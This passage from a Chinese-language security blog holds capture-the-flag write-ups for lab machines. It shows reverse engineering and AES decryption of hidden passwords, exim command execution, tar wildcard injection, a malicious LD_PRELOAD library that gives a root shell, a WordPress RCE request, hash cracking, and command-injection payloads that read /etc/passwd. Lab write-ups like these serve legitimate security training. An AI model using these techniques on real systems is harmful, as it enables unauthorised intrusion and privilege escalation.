1.2em;\r}\r\u0026lt;/style\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;h1\u0026gt;403 - Acceso denegado\u0026lt;/h1\u0026gt;\r\u0026lt;p\u0026gt;El encabezado \u0026lt;code\u0026gt;X-UUID-Access\u0026lt;/code\u0026gt; no está presente.\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;# 设置好后可以进入到页面，是一个下载页面\n[root@kali] /home/kali/stackinferno ❯ curl http://0internal_down.cybersec.dl -H \u0026#39;X-UUID-Access: f47ac10b-58cc-4372-a567-0e02b2c3d479\u0026#39;\r....\r....\r\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;Sec2Pass\u0026lt;/h1\u0026gt;\r\u0026lt;div class=\u0026#34;file-list\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;file-item\u0026#34;\u0026gt;\r\u0026lt;span class=\u0026#34;file-name\u0026#34;\u0026gt;sec2pass\u0026lt;/span\u0026gt;\r\u0026lt;button class=\u0026#34;download-btn\u0026#34; onclick=\u0026#34;downloadFile(\u0026#39;sec2pass\u0026#39;)\u0026#34;\u0026gt;Descargar\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;file-item\u0026#34;\u0026gt;\r\u0026lt;span class=\u0026#34;file-name\u0026#34;\u0026gt;sec2pass_note.txt\u0026lt;/span\u0026gt;\r\u0026lt;button class=\u0026#34;download-btn\u0026#34; onclick=\u0026#34;downloadFile(\u0026#39;sec2pass_note.txt\u0026#39;)\u0026#34;\u0026gt;Descargar\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rfunction downloadFile(fileName) {\rconst link = document.createElement(\u0026#39;a\u0026#39;);\rlink.href = `http://0internal_down.cybersec.dl/download/${fileName}`;\rlink.download = fileName; document.body.appendChild(link);\rlink.click();\rdocument.body.removeChild(link);\r}\r\u0026lt;/script\u0026gt;\r\u0026lt;/script\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;# Decompile #\r由于全局没有可以利用的静态字符串，因此还得从代码逻辑入手\n先来看看main函数代码\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rchar v4[112]; // [rsp+0h] [rbp-10F0h] BYREF\rchar v5[112]; // [rsp+70h] [rbp-1080h] BYREF\rchar dest[1024]; // [rsp+E0h] [rbp-1010h] BYREF\rchar s[1024]; // [rsp+4E0h] [rbp-C10h] BYREF\rchar format[1024]; // [rsp+8E0h] [rbp-810h] BYREF\rchar v9[1032]; // [rsp+CE0h] [rbp-410h] BYREF\runsigned __int64 v10; // [rsp+10E8h] [rbp-8h]\rv10 = __readfsqword(0x28u);\rmemset(dest, 0, sizeof(dest));\rstrcat(dest, AMLP);\rstrcat(dest, PRZS);\rstrcat(dest, ING);\r*(_WORD *)\u0026amp;dest[strlen(dest)] = 32;\rstrcat(dest, PROS);\r*(_WORD *)\u0026amp;dest[strlen(dest)] = 32;\rstrcat(dest, TANO);\rstrcat(dest, CHZ);\rstrcat(dest, PWD);\rstrcat(dest, CLIK);\rstrcat(dest, PARR);\rmemset(s, 0, sizeof(s));\rstrcat(s, TANO);\rstrcat(s, CHZ);\rstrcat(s, PWD);\rstrcat(s, CLIK);\rstrcat(s, ASMLF);\r*(_WORD *)\u0026amp;s[strlen(s)] = 32;\rstrcat(s, VNZ);\rstrcat(s, HK);\rstrcat(s, EEUU);\rstrcat(s, DNMC);\rstrcat(s, ERTG);\rmemset(format, 0, sizeof(format));\rstrcat(format, AMLP);\rstrcat(format, PRZS);\rstrcat(format, ING);\r*(_WORD *)\u0026amp;format[strlen(format)] = 32;\rstrcat(format, ASMQ);\r*(_WORD *)\u0026amp;format[strlen(format)] = 32;\rstrcat(format, NRG);\rstrcat(format, BRZL);\r*(_WORD *)\u0026amp;format[strlen(format)] = 32;\rstrcat(format, LAKDF);\r*(_WORD *)\u0026amp;format[strlen(format)] = 32;\rstrcat(format, WVWVEB);\rstrcat(format, RBWRTB);\rstrcat(format, AEBDV);\rstrcat(format, QQQQ);\rmemset(v9, 0, 0x400uLL);\rstrcat(v9, NRG);\rstrcat(v9, BRZL);\r*(_WORD *)\u0026amp;v9[strlen(v9)] = 32;\rstrcat(v9, LAKDF);\r*(_WORD *)\u0026amp;v9[strlen(v9)] = 32;\rstrcat(v9, WVWVEB);\rstrcat(v9, RBWRTB);\rstrcat(v9, AEBDV);\r*(_WORD *)\u0026amp;v9[strlen(v9)] = 32;\rstrcat(v9, VNZ);\rstrcat(v9, HK);\rstrcat(v9, EEUU);\rstrcat(v9, ASMQXZ);\rstrcat(v9, POIKJ);\rstrcat(v9, ERTG);\rfn2();\rprintf(dest);\r__isoc99_scanf(\u0026#34;%s\u0026#34;, v4);\rif ( b6v4c8(v4) )\r{\rprintf(format);\r__isoc99_scanf(\u0026#34;%s\u0026#34;, v5);\rif ( (unsigned int)x1w5z9(v5) )\r{\rk8j4h3();\rreturn 0;\r}\relse\r{\rprintf(v9);\rreturn 1;\r}\r}\relse\r{\rprintf(s);\rreturn 1;\r}\r} 关注一下b6v4c8函数里的逻辑👇\n_BOOL8 __fastcall b6v4c8(const char *a1)\r{\r__int64 v2; // [rsp+18h] [rbp-78h] BYREF\rchar s2[104]; // [rsp+20h] [rbp-70h] BYREF\runsigned __int64 v4; // [rsp+88h] [rbp-8h]\rv4 = __readfsqword(0x28u);\rif ( !(unsigned int)qw3e7t((__int64)\u0026amp;p0o9i8, 0x30u, (__int64)s2, \u0026amp;v2) )\rreturn 0LL;\rs2[v2] = 0;\rreturn strcmp(a1, s2) == 0;\r} qw3e7t函数逻辑👇，可以看到是一个AES_ECB的密码类型\n__int64 __fastcall qw3e7t(__int64 a1, unsigned int a2, __int64 a3, _QWORD *a4)\r{\r__int64 v5; // rax\rint v8; // [rsp+2Ch] [rbp-14h] BYREF\r__int64 v9; // [rsp+30h] [rbp-10h]\runsigned __int64 v10; // [rsp+38h] [rbp-8h]\rv10 = __readfsqword(0x28u);\rv9 = EVP_CIPHER_CTX_new();\rif ( v9 )\r{\rv5 = EVP_aes_256_ecb();\rif ( (unsigned int)EVP_DecryptInit_ex(v9, v5, 0LL, \u0026amp;zxq9v8, 0LL) == 1 )\r{\rif ( (unsigned int)EVP_DecryptUpdate(v9, a3, \u0026amp;v8, a1, a2) == 1 )\r{\r*a4 = v8;\rif ( (unsigned int)EVP_DecryptFinal_ex(v9, v8 + a3, \u0026amp;v8) == 1 )\r{\r*a4 += v8;\rEVP_CIPHER_CTX_free(v9);\rreturn 1LL;\r}\relse\r{\rfwrite(\u0026#34;Error al finalizar el descifrado.\\n\u0026#34;, 1uLL, 0x22uLL, _bss_start);\rEVP_CIPHER_CTX_free(v9);\rreturn 0LL;\r}\r}\relse\r{\rfwrite(\u0026#34;Error al descifrar los datos.\\n\u0026#34;, 1uLL, 0x1EuLL, _bss_start);\rEVP_CIPHER_CTX_free(v9);\rreturn 0LL;\r}\r}\relse\r{\rfwrite(\u0026#34;Error al inicializar el descifrado.\\n\u0026#34;, 1uLL, 0x24uLL, _bss_start);\rEVP_CIPHER_CTX_free(v9);\rreturn 0LL;\r}\r}\relse\r{\rfwrite(\u0026#34;Error al crear el contexto de cifrado.\\n\u0026#34;, 1uLL, 0x27uLL, _bss_start);\rreturn 0LL;\r}\r} 那么要绕过第一层的话，首先我们输入的明文要与密文解密一致\n获取一下密钥zxq9v8的内容，这里我使用的是gdb下断点然后找变量\n[root@kali] /home/kali/Downloads ❯ gdb sec2pass ⏎\rGNU gdb (Debian 15.2-1) 15.2\rCopyright (C) 2024 Free Software Foundation, Inc.\rLicense GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt;\rThis is free software: you are free to change and redistribute it.\rThere is NO WARRANTY, to the extent permitted by law.\rType \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details.\rThis GDB was configured as \u0026#34;x86_64-linux-gnu\u0026#34;.\rType \u0026#34;show configuration\u0026#34; for configuration details.\rFor bug reporting instructions, please see:\r\u0026lt;https://www.gnu.org/software/gdb/bugs/\u0026gt;.\rFind the GDB manual and other documentation resources online at:\r\u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;.\rFor help, type \u0026#34;help\u0026#34;.\rType \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;...\rReading symbols from sec2pass...\r(No debugging symbols found in sec2pass)\r(gdb) break qw3e7t\rBreakpoint 1 at 0x2687\r(gdb) run\rStarting program: /home/kali/Downloads/sec2pass [Thread debugging using libthread_db enabled]\rUsing host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;.\ringrese la contraseña: 123\rBreakpoint 1, 0x0000555555556687 in qw3e7t ()\r(gdb) x/s \u0026amp;zxq9v8\r0x55555555a300 \u0026lt;zxq9v8\u0026gt;: \u0026#34;w8fcencwcbuw9ef849f89999920484hf\u0026#34;\r(gdb) 得到密钥的内容是：w8fcencwcbuw9ef849f89999920484hf\n再来查看一下密文的内容，需要转成十六进制，传参中指定的是0x30u，因此是48位的\n(gdb) x/48xb \u0026amp;p0o9i8\r0x5555555580a0 \u0026lt;p0o9i8\u0026gt;: 0x30 0xbc 0x92 0x70 0xb1 0x5a 0xbe 0xb1\r0x5555555580a8 \u0026lt;p0o9i8+8\u0026gt;: 0x0f 0x8b 0x11 0xae 0x07 0x68 0x3d 0x11\r0x5555555580b0 \u0026lt;p0o9i8+16\u0026gt;: 0x47 0x06 0x6a 0x52 0x8f 0xfc 0x84 0x1c\r0x5555555580b8 \u0026lt;p0o9i8+24\u0026gt;: 0x82 0x78 0x26 0xc9 0x9f 0x26 0x4e 0x97\r0x5555555580c0 \u0026lt;p0o9i8+32\u0026gt;: 0xac 0xeb 0xef 0xe3 0x96 0x0d 0x23 0x31\r0x5555555580c8 \u0026lt;p0o9i8+40\u0026gt;: 0xbf 0xe0 0x45 0x70 0x44 0xda 0xcf 0xcd\r(gdb) 由于加密算法使用的是AES_ECB，因此有密文和密钥就够了（详细内容请自行搜索了解）\n解密代码👇\nkey = b\u0026#34;w8fcencwcbuw9ef849f89999920484hf\u0026#34; # 来自 \u0026amp;zxq9v8\rciphertext = bytes.fromhex(\r\u0026#34;30bc9270b15abeb10f8b11ae07683d1147066a528ffc841c827826c99f264e97\u0026#34;\r\u0026#34;acebefe3960d2331bfe0457044dacfcd\u0026#34;\r)\rfrom Crypto.Cipher import AES\rfrom Crypto.Util.Padding import unpad\rcipher = AES.new(key, AES.MODE_ECB)\rplaintext = cipher.decrypt(ciphertext)\r# 尝试去除 PKCS#7 填充\rtry:\rplaintext = unpad(plaintext, AES.block_size)\rexcept ValueError:\rpass\rprint(\u0026#34;解密后的密码:\u0026#34;, plaintext.decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;ignore\u0026#34;))\r#解密后的密码: 789dciubdicv478v7hs8478w72gbfv09893475 可以看到成功进入了第二层\n第二层的代码👇，还是一样的加密逻辑，只不过这里的密文长度只有0x10u，也就是16个字节\n_BOOL8 __fastcall x1w5z9(const char *a1)\r{\r__int64 v2; // [rsp+18h] [rbp-78h] BYREF\rchar s2[104]; // [rsp+20h] [rbp-70h] BYREF\runsigned __int64 v4; // [rsp+88h] [rbp-8h]\rv4 = __readfsqword(0x28u);\rif ( !(unsigned int)qw3e7t((__int64)\u0026amp;l3k7j5, 0x10u, (__int64)s2, \u0026amp;v2) )\rreturn 0LL;\rs2[v2] = 0;\rreturn strcmp(a1, s2) == 0;\r} 由于使用的都是qw3e7t同一个函数，因此密钥也是一样的\n这里获取密文l3k7j5\n(gdb) break qw3e7t Breakpoint 1 at 0x2687\r(gdb) run\rStarting program: /home/kali/Downloads/sec2pass [Thread debugging using libthread_db enabled]\rUsing host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;.\ringrese la contraseña: 789dciubdicv478v7hs8478w72gbfv09893475\rBreakpoint 1, 0x0000555555556687 in qw3e7t ()\r(gdb) x/16xb \u0026amp;l3k7j5\r0x5555555580d0 \u0026lt;l3k7j5\u0026gt;: 0x3a 0x37 0x1c 0x25 0x3d 0x6b 0x79 0xaf\r0x5555555580d8 \u0026lt;l3k7j5+8\u0026gt;: 0xf2 0x95 0x46 0xd8 0xab 0x48 0x70 0x37 再次解密一下👇\n# 从 gdb 输出的十六进制数据转换为字节（直接按顺序拼接）\rciphertext = bytes.fromhex(\u0026#34;3a371c253d6b79aff29546d8ab487037\u0026#34;)\rfrom Crypto.Cipher import AES\rfrom Crypto.Util.Padding import unpad\r# 密钥（与之前相同）\rkey = b\u0026#34;w8fcencwcbuw9ef849f89999920484hf\u0026#34; # 32字节 AES-256 密钥\r# 解密\rcipher = AES.new(key, AES.MODE_ECB)\rplaintext = cipher.decrypt(ciphertext)\r# 尝试去除 PKCS#7 填充（如果存在）\rtry:\rplaintext = unpad(plaintext, AES.block_size)\rexcept ValueError:\rpass # 无填充或长度正确\r# 输出结果\rprint(\u0026#34;解密后的密码（原始字节）:\u0026#34;, plaintext)\rprint(\u0026#34;尝试解码:\u0026#34;, plaintext.decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;replace\u0026#34;))\r#解密后的密码（原始字节）: b\u0026#39;00485825\u0026#39;\r#尝试解码: 00485825 得到明文：00485825\n两个明文都有了，执行文件，得到凭证\n在carlos的目录下拿到user.txt\nOwn robert #\r查看目录下有一个mbox的邮件信息\n这里我简略翻译一下\n# robert to carlos\r你好，卡洛斯，希望你一切都好。我跟你说一下，我得和协调员一起去另一个城市参加一个活动。问题是我没时间等你关于最近那次事件的报告，然后再把所有报告发送给德拉科尔有限公司（Dracor S.A.）的部门了。鉴于我不在，我会和管理员说，让他给你分配权限，这样你就可以用我的邮箱把报告发送给德拉科尔有限公司，因为他们正等着我就这个事情给回复呢。所以等你把报告准备好后，请发送一下。\r# carlos to robert\r你好，罗伯特，太好了，报告明天就会准备好。你和管理员说一下，有任何新情况都通知我。祝好。\r# robert to carlos\r你好，卡洛斯，我已经通知管理员（root）了，他在等你把申请发送到 root@cybersec 这个邮箱。记住申请的格式：\r申请人姓名：\r日期：\r信息：\r简要描述：\r在描述中，你务必写上以下案件编号，以便和我的申请保持连贯性，案件编号：000-01458。\r另外，留意你的邮箱，因为一旦他们给你开通权限，你就会收到通知。祝好。 使用下面的命令进行申请权限\necho -e \u0026#34;Nombre del solicitante: Carlos\\nFecha: $(date \u0026#39;+%Y-%m-%d\u0026#39;)\\nMensaje: Solicito permisos para enviar reporte a Dracor S.A.\\nBreve descripcion: Caso nro: 000-01458\u0026#34; | mail -s \u0026#34;Solicitud de permisos\u0026#34; root@cybersec 查看**/var/mail/carlos**\nFrom root@cybersec Wed Apr 16 12:43:10 2025\rReturn-path: \u0026lt;root@cybersec\u0026gt;\rEnvelope-to: carlos@cybersec\rDelivery-date: Wed, 16 Apr 2025 12:43:10 +0000\rReceived: from root by cybersec with local (Exim 4.96)\r(envelope-from \u0026lt;root@cybersec\u0026gt;)\rid 1u526c-00038R-2F\rfor carlos@cybersec;\rWed, 16 Apr 2025 12:43:06 +0000\rTo: carlos@cybersec\rSubject: exim\rMIME-Version: 1.0\rContent-Type: text/plain; charset=\u0026#34;ANSI_X3.4-1968\u0026#34;\rContent-Transfer-Encoding: 8bit\rMessage-Id: \u0026lt;E1u526c-00038R-2F@cybersec\u0026gt;\rFrom: root \u0026lt;root@cybersec\u0026gt;\rDate: Wed, 16 Apr 2025 12:43:06 +0000\rHola Carlos, ya puedes enviar correos como Robert. Estos permisos se revocarán periódicamente y tendrás que volver a solicitarlos.\r#你好，卡洛斯，你现在可以以罗伯特的身份发送邮件了。这些权限会定期被撤销，届时你将不得不再次申请它们。 这个时候检查sudo -l，会发现多了一个命令\nsudo -u robert /usr/sbin/exim -be \u0026#39;${run{/usr/bin/cp /tmp/authorized_keys /home/robert/.ssh/authorized_keys}}\u0026#39; 好像是必须通过绝对路径来执行\nOwn pedro #\r查看定时任务\nrobert@cybersec:/tmp$ cat /etc/crontab # /etc/crontab: system-wide crontab\r# Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39;\r# command to install the new version when you edit this file\r# and files in /etc/cron.d. These files also have username fields,\r# that none of the other crontabs do.\rSHELL=/bin/sh\rPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\r# Example of job definition:\r# .---------------- minute (0 - 59)\r# | .------------- hour (0 - 23)\r# | | .---------- day of month (1 - 31)\r# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...\r# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\r# | | | | |\r# * * * * * user-name command to be executed\r17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly\r25 6 * * * root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily; }\r47 6 * * 7 root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly; }\r52 6 1 * * root test -x /usr/sbin/anacron || { cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly; }\r#\r*/2 * * * * pedro /bin/bash /usr/local/bin/back.sh 两分钟会执行一次这个脚本，robert没有写入权限\nrobert@cybersec:/tmp$ cat /usr/local/bin/back.sh\r#!/bin/bash\rcd /home/share \u0026amp;\u0026amp; tar -czf /home/pedro/back.tar *\rrobert@cybersec:/tmp$ ls -al /usr/local/bin/back.sh\r-rwxr-x--- 1 pedro bk 63 Mar 27 14:11 /usr/local/bin/back.sh\rrobert@cybersec:/tmp$ groups robert users back bk 注意到这个tar命令最后面跟上了一个星号通配符，所有文件都会被拼接上去\ntar | GTFOBins 因此如果是将参数名作为文件名拼上去的话，会被识别为参数\n#在/home/share目录下\recho \u0026#34;mkdir /home/pedro/.ssh/;cp /tmp/authorized_keys /home/pedro/.ssh/authorized_keys\u0026#34; \u0026gt;shell.sh\rtouch -- \u0026#34;--checkpoint-action=exec=sh shell.sh\u0026#34;\rtouch -- \u0026#34;--checkpoint=1\u0026#34; 等一会就能登录了\nRoot #\r查看mbox消息\n# admin to pedro\r佩德罗，我们在我留在你目录里的二进制文件中检测到了一个可能存在的后门。（这个二进制文件是德拉科尔有限公司之前的开发团队开发的，用于记录员工的出入情况），我们需要你对其进行分析，并尽快提交一份报告。期待你的反馈，祝好。\r# pedro to amin\r下午好，我先向您汇报截至目前分析得出的最相关数据。\r实际上，该二进制文件确实存在一个后门，这个后门是通过一个在程序正常执行过程中从未被调用过的函数来激活的。同时还检测到了一个缓冲区溢出情况，这很可能是进入该后门的触发因素。然而，到目前为止，我在进一步深入分析方面受到了一些限制，因为无法调试该二进制文件（没有权限），并且也无法在虚拟机中运行它。这个二进制文件会对其执行环境进行检查，如果检测到是在虚拟机中，它就不会运行；当我尝试调试它时也是一样，它检测到正在尝试调试，就不会运行。\r如果有可能的话，我需要能够以管理员权限运行调试器来调试这个二进制文件，并强制进行调试操作。期待您的回复，祝好。\r# admin to pedro\r你好，佩德罗，我读了你的邮件，还有另一个问题想问你。你觉得有没有可能为这个二进制文件开发一个概念验证（POC）呢？因为这将是对德拉科尔有限公司之前开发团队有力的一次检验。\r至于给你权限以便你能够调试这个二进制文件（毕竟无法在虚拟机中运行它，也不能在没有权限的情况下调试它），我会通知管理员（超级用户）来配置环境，这样我们就能尽可能安全地处理这件事。请等待我的新消息，我很快会再给你写信……\r你好，佩德罗，正如我跟你说过的，我会通知管理员来配置环境，这样就能给你提供你所要求的权限，现在一切都已准备就绪。当你需要关于 GDB（GNU 调试器）的权限时，你就通过 root@cybersec 联系管理员告知他。和往常一样，在开启权限之前，你必须发送以下申请格式的内容：\r申请人姓名：\r日期：\r信息：\r简要说明： 查看一下目录下有一个分析报告\n#pedro@cybersec:~/analisis_hallx$ cat notas_hallx.txt 关于已发现的二进制文件 hallx 的报告笔记\r二进制文件的功能\r该二进制文件的主要功能是记录用户的进出情况。\r已检测到的漏洞\r缓冲区溢出：\r从图片中可以看出，在factor2()函数中存在缓冲区溢出漏洞，因为它允许读取最多（0x80）128 个字节的数据，但缓冲区大小仅为 72 个字节，这就导致了缓冲区溢出（BOF）。\r恶意函数：\r在程序正常执行期间，factor1()函数从未被调用过（就像其他一些无用 / 填充函数一样）。在这个函数中，通过execve调用了一个 shell 程序（/usr/bin/bash）。\r虚拟化检测和反调试功能\r该二进制文件包含两个在程序开始时运行的函数 [check_virtualization()和checkDebugger()]，这些函数负责检测程序是否在虚拟化环境中运行，同时也用于检测是否正在对其进行调试。似乎在没有权限的情况下不允许进行调试（需要在虚拟机之外对此进行测试）。 先发送以下命令获取权限\n# 发送权限申请邮件（包含案件编号）\recho -e \u0026#34;Nombre del solicitante: Pedro\\nFecha: $(date \u0026#39;+%d/%m/%Y\u0026#39;)\\nMensaje: Solicitud de privilegios de depuracion\\nBreve descripcion: Analisis de puerta trasera - Caso 000-0923\u0026#34; | mail -s \u0026#34;Solicitud GDB - Caso 000-0923\u0026#34; -a \u0026#34;From: pedro@cybersec\u0026#34; -a \u0026#34;Content-Type: text/plain; charset=ANSI_X3.4-1968\u0026#34; root@cybersec 这里先准备一个恶意的so文件\n// gcc -shared -fPIC evil.c -o evil.so\r#include \u0026lt;stdlib.h\u0026gt;\r__attribute__((constructor)) void init() {\rsystem(\u0026#34;/bin/bash -p\u0026#34;);\r} 然后运行\npedro@cybersec:/var/mail$ sudo -u root /usr/local/bin/secure_gdb /home/pedro/hallx (gdb) set environment LD_PRELOAD=/home/pedro/evil.so\r(gdb) run 然后就能进入到root的shell\n这里我的so文件中命令给错了，导致一直卡在root的bash里面，退不出去\n因此改成其他的提权语句就好了，不必开启一个bash\n#include \u0026lt;stdlib.h\u0026gt;\r__attribute__((constructor)) void init() {\rsystem(\u0026#34;chmod u+s /bin/bash\u0026#34;);\r} 再次执行之后，可以成功设置SUID，另外一边直接关掉终端就好了\nSummary #\rUser：API接口枚举，用户名爆破，得到域名，下载后进行逆向分析，根据AES解密得到明文，输入后得到用户的ssh密码。通过发送邮件可以获得到robert的sudo命令权限。根据pedro的定时任务中的通配符，可以写入恶意文件名，让其当作参数处理，得到pedro的权限。\nRoot：设置恶意的LD_PRELOAD环境变量，让其执行的时候引入恶意代码，设置bash的SUID，成功提权。\n终于写完了，长舒一口气~~~~\n","date":"2025-04-17","externalUrl":null,"permalink":"/posts/2025/04/dockerlabs-stackinferno/","section":"Posts","summary":"","title":"Dockerlabs-stackinferno","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.151 -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)\r| ssh-hostkey: | 2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)\r| 256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)\r|_ 256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)\r80/tcp open http nginx 1.14.2\r| http-robots.txt: 1 disallowed entry |_/wp-admin/\r|_http-server-header: nginx/1.14.2\r|_http-generator: WordPress 6.7.1\r|_http-title: bammmmuwe 直接就扫到了wordpress目录\nNuclei #\r[root@kali] /home/kali ❯ nuclei -u http://192.168.56.151 __ _\r____ __ _______/ /__ (_)\r/ __ \\/ / / / ___/ / _ \\/ /\r/ / / / /_/ / /__/ / __/ /\r/_/ /_/\\__,_/\\___/_/\\___/_/ v3.3.9\rprojectdiscovery.io\r[INF] Current nuclei version: v3.3.9 (outdated)\r[INF] Current nuclei-templates version: v10.1.7 (latest)\r[WRN] Scan results upload to cloud is disabled.\r[INF] New templates added in latest release: 64\r[INF] Templates loaded for current scan: 7880\r[INF] Executing 7687 signed templates from projectdiscovery/nuclei-templates\r[WRN] Loading 193 unsigned templates for scan. Use with caution.\r[INF] Targets loaded for current scan: 1\r[INF] Templates clustered: 1718 (Reduced 1615 Requests)\r[INF] Using Interactsh Server: oast.site\r[CVE-2024-50498] [http] [critical] http://192.168.56.151/index.php?rest_route=/wqc/v1/query Own www-data #\r尝试复现这个CVE：RandomRobbieBF/CVE-2024-50498: WP Query Console \u0026lt;= 1.0 - Unauthenticated Remote Code Execution\nPOST /wp-json/wqc/v1/query HTTP/1.1\rHost: 192.168.56.151\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rConnection: close\rContent-Type: application/json\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\rContent-Length: 45\r{\u0026#34;queryArgs\u0026#34;:\u0026#34;phpinfo();\u0026#34;,\u0026#34;queryType\u0026#34;:\u0026#34;post\u0026#34;} 查看disable_functions，可以使用shell_exec\nOwn welcome #\r根据wp-config.php里的凭证，进入数据库\nwww-data@listen:~/html/wordpress$ mysql -ull104567 -pthehandsomeguy -e \u0026#39;use wordpress;select * from wp_users;\u0026#39; -E\r*************************** 1. row ***************************\rID: 1\ruser_login: ta0\ruser_pass: $P$BDDc71nM67DbOVN/U50WFGII6EF6.r.\ruser_nicename: ta0\ruser_email: 2814928906@qq.com\ruser_url: http://192.168.31.181\ruser_registered: 2025-01-08 03:10:43\ruser_activation_key: user_status: 0\rdisplay_name: ta0\r*************************** 2. row ***************************\rID: 2\ruser_login: welcome\ruser_pass: $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/\ruser_nicename: welcome\ruser_email: 127.0.0.1@qq.com\ruser_url: user_registered: 2025-01-08 04:29:28\ruser_activation_key: 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD.\ruser_status: 0\rdisplay_name: welcome 使用john爆破\n[root@kali] /home/kali/temp ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt ⏎\rUsing default input encoding: UTF-8\rLoaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])\rCost 1 (iteration count) is 8192 for all loaded hashes\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\r104567 (?) 1g 0:00:00:22 DONE (2025-04-17 20:30) 0.04484g/s 33182p/s 33182c/s 33182C/s 10801..103645\rUse the \u0026#34;--show --format=phpass\u0026#34; options to display all of the cracked passwords reliably\rSession completed. Root #\r$ sudo -l\rMatching Defaults entries for welcome on listen:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser welcome may run the following commands on listen:\r(ALL) NOPASSWD: /usr/bin/gobuster 可以使用**-v**参数输出详细\n可惜的是我们无法直接读取到**/root/root.txt以及ssh**密钥等\n查看定时任务呢？发现会执行一个脚本\n因此可以尝试来进行覆盖文件\n首先需要在kali的**/tmp里生成一个aaa**文件\n[root@kali] /tmp ❯ touch aaa [root@kali] / ❯ python -m http.server 80 写入一个字典，查看回显\nwelcome@listen:~$ cat poc tmp/aaa\rwelcome@listen:~$ sudo /usr/bin/gobuster -u http://192.168.55.4/ -w ./poc -q -n /tmp/aaa 再将输出定向到**/opt/.test.sh**，注意给aaa执行权限\nwelcome@listen:~$ chmod +x /tmp/aaa welcome@listen:~$ sudo /usr/bin/gobuster -u http://192.168.55.4/ -w ./poc -q -n -o /opt/.test.sh /tmp/aaa Summary #\rUser：通过CVE拿到数据库密码hash进行爆破\nRoot：通过日志输出修改定时任务的内容\n","date":"2025-04-17","externalUrl":null,"permalink":"/posts/2025/04/hackmyvm-buster/","section":"Posts","summary":"","title":"HackMyVM-buster","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Chocoping ❯ nmap 172.17.0.2 -sV -A -p- PORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.62\r|_http-title: Index of /\r|_http-server-header: Apache/2.4.62 (Debian)\r| http-ls: Volume /\r| SIZE TIME FILENAME\r| 1.0K 2025-04-05 11:13 ping.php Own www-data #\r注意到可以传入ip参数执行ping命令\n下面我会用两种扫描工具来进行对比\n这里使用wfuzz来进行扫描\n[root@kali] /home/kali/Chocoping ❯ wfuzz -c --hw 3 -z file,../Desktop/fuzzDicts/rcePayloads/RCE-filter-and-WAF-Bypass.txt \u0026#34;http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ\u0026#34;\r/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information.\r********************************************************\r* Wfuzz 3.1.0 - The Web Fuzzer *\r********************************************************\rTarget: http://172.17.0.2/ping.php?ip=127.0.0.1;FUZZ\rTotal requests: 174\r=====================================================================\rID Response Lines Word Chars Payload =====================================================================\r000000070: 200 0 L 1 W 22 Ch \u0026#34;c\\\\a\\\\t+/et\\\\c/pas\\\\swd\u0026#34; 000000165: 200 0 L 1 W 22 Ch \u0026#34;cat `echo -e \u0026#34;\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\u0026#34;`\u0026#34; 000000142: 